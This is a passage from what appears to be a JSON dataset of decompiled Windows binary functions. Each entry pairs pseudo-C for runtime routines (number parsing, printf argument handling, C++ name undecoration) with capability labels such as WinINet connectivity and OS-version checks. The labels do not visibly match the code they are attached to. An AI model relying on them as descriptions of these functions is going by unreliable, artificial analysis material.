{\n        *arg_ch = var_14h;\n        if (var_1h != 0) {\n            return 2;\n        }\n        return 7;\n    }\n    puVar11 = *arg_ch;\n    uVar12 = *puVar11;\n    puVar8 = puVar11 + 1;\n    uVar6 = var_8h & 0xffff0000;\n    var_8h = uVar6 | uVar12;\n    *arg_ch = puVar8;\n    if (uVar12 == 0x45) {\ncode_r0x004b568e:\n        uVar4 = var_1h ^ 1;\n    }\n    else if (uVar12 == 0x50) {\ncode_r0x004b5689:\n        uVar4 = var_1h;\n    }\n    else {\n        if (uVar12 == 0x65) goto code_r0x004b568e;\n        uVar4 = 0;\n        if (uVar12 == 0x70) goto code_r0x004b5689;\n    }\n    iVar5 = 0;\n    if (uVar4 != 0) {\n        uVar12 = *puVar8;\n        *arg_ch = puVar11 + 2;\n        if ((uVar12 == 0x2b) || (uVar9 = uVar12,  uVar12 == 0x2d)) {\n            uVar9 = puVar11[2];\n            *arg_ch = puVar11 + 3;\n        }\n        var_8h = uVar6 | uVar9;\n        bVar2 = false;\n        if (uVar9 == 0x30) {\n            bVar2 = true;\n            do {\n                uVar9 = **arg_ch;\n                var_8h = var_8h & 0xffff0000 | uVar9;\n                *arg_ch = *arg_ch + 1;\n            } while (uVar9 == 0x30);\n        }\n        do {\n            uVar7 = uVar9;\n            uVar6 = uVar9;\n            if (uVar9 < 0x30) goto code_r0x004b5917;\n            if (uVar9 < 0x3a) {\n                uVar6 = uVar6 - 0x30;\ncode_r0x004b5912:\n                if (uVar6 == 0xffffffff) goto code_r0x004b5917;\n            }\n            else {\n                if (0xff0f < uVar9) {\n                    if (uVar9 < 0xff1a) {\n                        uVar6 = uVar6 - 0xff10;\n                    }\n                    else {\n                        uVar6 = 0xffffffff;\n                    }\n                    goto code_r0x004b5912;\n                }\n                if (0x65f < uVar9) {\n                    if (uVar9 < 0x66a) {\n                        uVar6 = uVar6 - 0x660;\n                    }\n                    else {\n                        if (uVar9 < 0x6f0) goto code_r0x004b5917;\n                        if (uVar9 < 0x6fa) {\n                            uVar6 = uVar6 - 0x6f0;\n                        }\n                        else {\n                            if (uVar9 < 0x966) goto code_r0x004b5917;\n                            if (uVar9 < 0x970) {\n                                uVar6 = uVar6 - 0x966;\n                            }\n                            else {\n                                if (uVar9 < 0x9e6) goto code_r0x004b5917;\n                                if (uVar9 < 0x9f0) {\n                                    uVar6 = uVar6 - 0x9e6;\n                                }\n                                else {\n                                    if (uVar9 < 0xa66) goto code_r0x004b5917;\n                                    if (uVar9 < 0xa70) {\n                                        uVar6 = uVar6 - 0xa66;\n                                    }\n                                    else {\n                                        if (uVar9 < 0xae6) goto code_r0x004b5917;\n                                        if (uVar9 < 0xaf0) {\n                                            uVar6 = uVar6 - 0xae6;\n                                        }\n                                        else {\n                                            if (uVar9 < 0xb66) goto code_r0x004b5917;\n                                            if (uVar9 < 0xb70) {\n                                                uVar6 = uVar6 - 0xb66;\n                                            }\n                                            else {\n                                                if (uVar9 < 0xc66) goto code_r0x004b5917;\n                                                if (uVar9 < 0xc70) {\n                                                    uVar6 = uVar6 - 0xc66;\n                                                }\n                                                else {\n                                                    if (uVar9 < 0xce6) goto code_r0x004b5917;\n                                                    if (uVar9 < 0xcf0) {\n                                                        uVar6 = uVar6 - 0xce6;\n                                                    }\n                                                    else {\n                                                        if (uVar9 < 0xd66) goto code_r0x004b5917;\n                                                        if (uVar9 < 0xd70) {\n                                                            uVar6 = uVar6 - 0xd66;\n                                                        }\n                                                        else {\n                                                            if (uVar9 < 0xe50) goto code_r0x004b5917;\n                                                            if (uVar9 < 0xe5a) {\n                                                                uVar6 = uVar6 - 0xe50;\n                                                            }\n                                                            else {\n                                                                if (uVar9 < 0xed0) goto code_r0x004b5917;\n                                                                if (uVar9 < 0xeda) {\n                                                                    uVar6 = uVar6 - 0xed0;\n                                                                }\n                                                                else {\n                                                                    if (uVar9 < 0xf20) goto code_r0x004b5917;\n                                                                    if (uVar9 < 0xf2a) {\n                                                                        uVar6 = uVar6 - 0xf20;\n                                                                    }\n                                                                    else {\n                                                                        if (uVar9 < 0x1040) goto code_r0x004b5917;\n                                                                        if (uVar9 < 0x104a) {\n                                                                            uVar6 = uVar6 - 0x1040;\n                                                                        }\n                                                                        else {\n                                                                            if (uVar9 < 0x17e0) goto code_r0x004b5917;\n                                                                            if (uVar9 < 0x17ea) {\n                                                                                uVar6 = uVar6 - 0x17e0;\n                                                                            }\n                                                                            else {\n                                                                                if ((uVar9 < 0x1810) || (0x1819 < uVar9)\n                                                                                   ) goto code_r0x004b5917;\n                                                                                uVar6 = uVar6 - 0x1810;\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    goto code_r0x004b5912;\n                }\ncode_r0x004b5917:\n                if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < uVar7 - 0x61)) {\n                    uVar6 = 0xffffffff;\n                }\n                else {\n                    uVar6 = uVar7;\n                    if (uVar7 - 0x61 < 0x1a) {\n                        uVar6 = uVar7 - 0x20;\n                    }\n                    uVar6 = uVar6 - 0x37;\n                }\n            }\n            bVar1 = bVar2;\n            if (9 < uVar6) goto code_r0x004b5980;\n            bVar2 = true;\n            bVar1 = true;\n            var_ch = var_ch * 10 + uVar6;\n            if (0x1450 < var_ch) goto code_r0x004b5973;\n            uVar9 = **arg_ch;\n            *arg_ch = *arg_ch + 1;\n            var_8h = var_8h & 0xffff0000 | uVar9;\n        } while( true );\n    }\ncode_r0x004b5c49:\n    fcn.00402f04(var_8h);\n    piVar10 = arg_10h + 2;\n    if (var_10h != piVar10) {\n        do {\n            if (*(var_10h + -1) != '\\0') break;\n            var_10h = var_10h + -1;\n        } while (var_10h != piVar10);\n        if (var_10h != piVar10) {\n            if (0x1450 < iVar5) {\n                return 9;\n            }\n            if (-0x1451 < iVar5) {\n                iVar5 = iVar5 + (((var_1h == 0) - 1 & 3) + 1) * var_18h;\n                if (0x1450 < iVar5) {\n                    return 9;\n                }\n                if (-0x1451 < iVar5) {\n                    *arg_10h = iVar5;\n                    arg_10h[1] = var_10h - piVar10;\n                    return var_1h;\n                }\n            }\n            return 8;\n        }\n    }\n    return 2;\n}\n",
        "token_count": 7231
    },
    "0040252c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040252c(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t arg_ch_00;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *puVar6;\n    uint var_3ch;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    fcn.00403120(0x30);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    puVar2 = fcn.0040273e(unaff_EBP + -0x3c);\n    puVar6 = extraout_ECX + 0x2c;\n    for (iVar5 = 0xb; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    arg_ch_00 = fcn.00401357();\n    iVar5 = *(unaff_EBP + -0x10);\n    *(unaff_EBP + -0x10) = iVar5;\n    *(iVar5 + 8) = 0;\n    *(iVar5 + 0x10) = 0;\n    *(iVar5 + 0x14) = 0;\n    *(iVar5 + 0x18) = 0;\n    uVar3 = *(arg_ch_00 + 0x1c);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.00401cc1(uVar3, 0, extraout_ECX + 0x2c);\n    *(iVar5 + 8) = uVar3;\n    fcn.0040196f(0, arg_ch_00);\n    if (*(iVar5 + 0x28) == '\\0') {\n        cVar1 = *(arg_ch_00 + 0x29);\n    }\n    else {\n        cVar1 = *(arg_ch_00 + 0x28);\n    }\n    iVar4 = cVar1;\n    *(iVar5 + 0x1c) = iVar4;\n    if ((iVar4 < 0) || (0x7e < iVar4)) {\n        *(iVar5 + 0x1c) = 0;\n    }\n    fcn.0040317a(iVar5 + 0x20, *(arg_ch_00 + 0x2b), *(arg_ch_00 + 0x2a), *(arg_ch_00 + 0x2e));\n    fcn.0040317a(iVar5 + 0x24, *(arg_ch_00 + 0x2d), *(arg_ch_00 + 0x2c), *(arg_ch_00 + 0x2f));\n    if (*(unaff_EBP + 0xc) != '\\0') {\n        *(iVar5 + 0x20) = 0x76782b24;\n        *(iVar5 + 0x24) = 0x76782b24;\n    }\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 753
    },
    "00402554": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00402554(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t arg_10h_00;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_ECX;\n    char cVar6;\n    char cVar7;\n    uint var_1h;\n    \n    uVar1 = *(arg_8h + 1);\n    arg_10h_00 = in_EAX & 0xffffff00 | uVar1;\n    cVar2 = arg_10h;\n    if ((uVar1 == 0x70) || (cVar2 == 'p')) {\n        return (uVar1 == 0x70) != (cVar2 != 'p');\n    }\n    cVar3 = '\\0';\n    if ((uVar1 == 0x73) || (var_1h._0_1_ = '\\0',  uVar1 == 0x53)) {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((cVar2 == 's') || (cVar7 = cVar3,  cVar2 == 'S')) {\n        cVar7 = '\\x01';\n    }\n    if ((uVar1 == 99) || (cVar6 = cVar3,  uVar1 == 0x43)) {\n        cVar6 = '\\x01';\n    }\n    if ((cVar2 == 'c') || (cVar2 == 'C')) {\n        cVar3 = '\\x01';\n    }\n    if (var_1h == '\\0') {\n        if (cVar7 != '\\0') {\n            return false;\n        }\n        if (cVar6 == '\\0') {\n            if (cVar3 != '\\0') {\n                return false;\n            }\n            cVar2 = fcn.00404647(arg_10h_00);\n            cVar3 = fcn.00404647(arg_10h);\n            if (cVar2 == '\\0') {\n                if (cVar3 != '\\0') {\n                    return false;\n                }\n                return *arg_8h == arg_ch;\n            }\n            if (cVar2 != cVar3) {\n                return false;\n            }\n            if ((arg_8h[3] == 9) != (arg_14h == 9)) {\n                return false;\n            }\n            iVar4 = fcn.00402798(arg_8h[3]);\n            iVar5 = fcn.00402798(arg_14h);\n            return iVar4 == iVar5;\n        }\n    }\n    else if (var_1h != cVar7) {\n        return false;\n    }\n    if (cVar6 == cVar3) {\n        cVar2 = fcn.004047f5(*in_ECX, in_ECX[1], arg_10h_00, arg_8h[3]);\n        cVar3 = fcn.004047f5(*in_ECX, in_ECX[1], arg_10h, arg_14h);\n        if (cVar2 == cVar3) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 764
    },
    "00402630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402630(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    if (*param_1 == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 83
    },
    "00402694": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl fcn.00402694(uint *arg_8h, uint16_t **arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    uint *arg_8h_00;\n    uint *puVar4;\n    uint16_t *puVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint16_t *var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    puVar5 = *arg_ch;\n    puVar4 = arg_8h;\n    puVar2 = puVar5;\n    if (arg_8h == NULL) {\n        while ((iVar3 = fcn.0040678f(&var_ch, *puVar5, arg_14h),  iVar3 != -1 &&\n               ((iVar3 == 0 || (*(&var_10h + iVar3 + 3) != '\\0'))))) {\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        while( true ) {\n            var_10h = puVar2;\n            arg_8h_00 = puVar4;\n            if (arg_10h < 4) {\n                arg_8h_00 = &var_ch;\n            }\n            uVar1 = fcn.0040678f(arg_8h_00, *puVar5, arg_14h);\n            if (uVar1 == 0xffffffff) {\n                *arg_ch = var_10h;\n                goto code_r0x004de568;\n            }\n            if (arg_8h_00 != puVar4) {\n                puVar2 = var_10h;\n                if (arg_10h < uVar1) goto code_r0x004de520;\n                fcn.00405830(puVar4, arg_8h_00, uVar1);\n            }\n            if ((uVar1 != 0) && (*(puVar4 + (uVar1 - 1)) == '\\0')) break;\n            puVar5 = puVar5 + 1;\n            if (uVar1 != 0) {\n                var_10h = puVar5;\n            }\n            arg_10h = arg_10h - uVar1;\n            puVar4 = puVar4 + uVar1;\n            puVar2 = var_10h;\n        }\n        puVar2 = NULL;\ncode_r0x004de520:\n        *arg_ch = puVar2;\n    }\ncode_r0x004de568:\n    fcn.004030bc(arg_8h);\n    return;\n}\n",
        "token_count": 639
    },
    "004026b7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004026b7(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040117c(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return 1;\n}\n",
        "token_count": 334
    },
    "004026df": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004026df(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00405fec(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 350
    },
    "00402838": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402838(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    cVar1 = *arg_8h;\n    while ((cVar1 != '\\0' && (iVar2 != arg_ch))) {\n        iVar2 = iVar2 + 1;\n        cVar1 = arg_8h[iVar2];\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "00402860": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402860(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if ((((arg_8h != 0) && (arg_8h != 0x400)) && (arg_8h != 0x800)) &&\n       (((arg_ch != 0 || (arg_10h < 1)) && (-1 < arg_10h)))) {\n        iVar5 = 0;\n        iVar4 = 0xe3;\n        do {\n            iVar3 = (iVar4 + iVar5) / 2;\n            iVar1 = *(iVar3 * 8 + 0x55aee0);\n            if (arg_8h == iVar1) goto code_r0x004dd589;\n            if (arg_8h - iVar1 < 0) {\n                iVar4 = iVar3 + -1;\n            }\n            else {\n                iVar5 = iVar3 + 1;\n            }\n        } while (iVar5 <= iVar4);\n        iVar3 = -1;\ncode_r0x004dd589:\n        if (-1 < iVar3) {\n            arg_8h_00 = *(iVar3 * 8 + 0x55aee4);\n            iVar4 = fcn.00403eb8(arg_8h_00, 0x55);\n            if (0 < arg_10h) {\n                if (arg_10h <= iVar4) {\n                    return 0;\n                }\n                iVar5 = fcn.00403977(arg_ch, arg_10h, arg_8h_00);\n                if (iVar5 != 0) {\n                    fcn.0040366b(0, 0, 0, 0, 0);\n                    pcVar2 = swi(3);\n                    iVar4 = (*pcVar2)();\n                    return iVar4;\n                }\n            }\n            return iVar4 + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 472
    },
    "00402865": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00402865(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint *puVar3;\n    char cVar4;\n    uint uVar5;\n    uint noname_0;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_4h;\n    \n    fcn.00405434(0x38);\n    iVar1 = *(unaff_EBP + 0x1c);\n    puVar2 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x44) = *(unaff_EBP + 8);\n    uVar5 = *(iVar1 + 0x30);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x24);\n    fcn.004032d3(uVar5);\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.00401a64(noname_0, unaff_EBP + -0x30, unaff_EBP + 0xc, unaff_EBP + 0x14, *(iVar1 + 0x14), \n                         unaff_EBP + -0x3c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00405146();\n    if (*(unaff_EBP + -0x30) == '\\0') {\n        puVar3 = *(unaff_EBP + -0x34);\n        *puVar2 = 2;\n        *puVar3 = 0;\n    }\n    else {\n        uVar5 = fcn.004042c3(unaff_EBP + -0x30, unaff_EBP + -0x40, uVar5, unaff_EBP + -0x38);\n        **(unaff_EBP + -0x34) = uVar5;\n        if ((*(unaff_EBP + -0x40) == unaff_EBP + -0x30) || (*(unaff_EBP + -0x38) != 0)) {\n            *puVar2 = 2;\n        }\n    }\n    cVar4 = fcn.00404011(unaff_EBP + 0x14);\n    if (cVar4 != '\\0') {\n        *puVar2 = *puVar2 | 1;\n    }\n    puVar3 = *(unaff_EBP + -0x44);\n    uVar5 = *(unaff_EBP + 0x10);\n    *puVar3 = *(unaff_EBP + 0xc);\n    puVar3[1] = uVar5;\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 693
    },
    "004028a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004028a6(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (**0x574458 == '\\0') {\n        fcn.004017df(1);\n    }\n    else {\n        iVar1 = fcn.00406893(*0x574458, \"??_C\", 4);\n        if (iVar1 != 0) {\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            *(arg_8h + 1) = 2;\n            return arg_8h;\n        }\n        *0x574458 = *0x574458 + 4;\n        fcn.00403535(arg_8h, 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 175
    },
    "004028c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004028c4(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    if (*arg_8h == 0) {\n        *arg_8h = arg_ch;\n        *(arg_8h + 1) = arg_10h;\n        arg_8h[3] = arg_14h;\n    }\n    else {\n        cVar1 = fcn.00401f50(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (cVar1 == '\\0') {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 200
    },
    "004028e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004028e2(void)\n\n{\n    int32_t iStack40;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    for (iStack28 = 0x20; 0 < iStack28; iStack28 = iStack28 + -1) {\n    }\n    for (iStack32 = 0x1b; 0 < iStack32; iStack32 = iStack32 + -1) {\n    }\n    for (iStack36 = 0x2c; 0 < iStack36; iStack36 = iStack36 + -1) {\n    }\n    for (iStack40 = 9; 0 < iStack40; iStack40 = iStack40 + -1) {\n    }\n    return 0x1d0d;\n}\n",
        "token_count": 188
    },
    "00402941": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402941(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040117c(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        iVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 344
    },
    "0040295a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040295a(char **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    char *pcVar3;\n    char **ppcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint *arg_8h_00;\n    char *pcVar7;\n    uint *unaff_ESI;\n    char *pcVar8;\n    uint var_3ch;\n    uint var_34h;\n    char **var_2ch;\n    uint var_28h;\n    char *var_1dh;\n    char *var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    pcVar3 = *0x574458;\n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_2ch = arg_8h;\n    var_1dh._0_1_ = **0x574458;\n    if (var_1dh - 0x30U < 10) {\n        *0x574458 = *0x574458 + 1;\n        fcn.00401f32(arg_8h, var_1dh - 0x30U);\n        goto code_r0x004934c6;\n    }\n    if (var_1dh == '?') {\n        ppcVar4 = fcn.00402cde(&var_28h, 0);\n        unique0x00007a00 = *ppcVar4;\n        var_18h = ppcVar4[1];\n        pcVar7 = var_18h;\n        pcVar8 = unique0x00007a00;\n        pcVar3 = *0x574458 + 1;\n        if (**0x574458 != '@') {\n            fcn.00402eb9((**0x574458 != '\\0') + 1);\n            pcVar7 = var_18h;\n            pcVar8 = stack0xffffffe0;\n            pcVar3 = *0x574458;\n        }\n    }\n    else {\n        iVar5 = fcn.0049389c(*0x574458, \"template-parameter-\", 0x13);\n        if (iVar5 == 0) {\n            stack0xffffffe0 = \"`template-parameter-\";\n            *0x574458 = pcVar3 + 0x13;\n            var_18h = 0x14;\ncode_r0x004933ae:\n            fcn.0040632f(&var_28h);\n            if (((*0x574460 & 0x4000) == 0) || (*0x574468 == NULL)) {\n                fcn.00402d47(&var_1dh + 1);\n                fcn.004053b7(&var_1dh + 1, &var_28h);\n                arg_8h_00 = &var_3ch;\n            }\n            else {\n                fcn.00403e54(&var_14h, 0x10);\n                pcVar2 = *0x574468;\n                uVar6 = fcn.00406799(&var_14h);\n                (**0x578000)(uVar6);\n                iVar5 = (*pcVar2)();\n                if (iVar5 != 0) {\n                    var_18h = var_18h & 0xffffff00;\n                    ppcVar4 = fcn.00404cd7(iVar5);\n                    goto code_r0x00493486;\n                }\n                fcn.00402d47(&var_1dh + 1);\n                unaff_ESI = &var_28h;\n                fcn.004053b7(&var_1dh + 1, unaff_ESI);\n                arg_8h_00 = &var_34h;\n            }\n            ppcVar4 = fcn.0040330f(arg_8h_00, 0x27);\n        }\n        else {\n            iVar5 = fcn.0049389c(pcVar3, \"generic-type-\", 0xd);\n            if (iVar5 == 0) {\n                stack0xffffffe0 = \"`generic-type-\";\n                *0x574458 = pcVar3 + 0xd;\n                var_18h = 0xe;\n                goto code_r0x004933ae;\n            }\n            if ((arg_10h != '\\0') && (var_1dh == '@')) {\n                pcVar8 = NULL;\n                pcVar7 = NULL;\n                pcVar3 = pcVar3 + 1;\n                goto code_r0x0049348b;\n            }\n            ppcVar4 = fcn.00406848(0x574458, 0x40);\n        }\ncode_r0x00493486:\n        pcVar7 = ppcVar4[1];\n        pcVar8 = *ppcVar4;\n        pcVar3 = *0x574458;\n    }\ncode_r0x0049348b:\n    *0x574458 = pcVar3;\n    piVar1 = *0x574450;\n    if (((arg_ch != '\\0') && (**0x574450 != 9)) && (pcVar8 != NULL)) {\n        ppcVar4 = fcn.0040528b(8);\n        if (ppcVar4 != NULL) {\n            *ppcVar4 = pcVar8;\n            ppcVar4[1] = pcVar7;\n            *piVar1 = *piVar1 + 1;\n            piVar1[*piVar1 + 1] = ppcVar4;\n        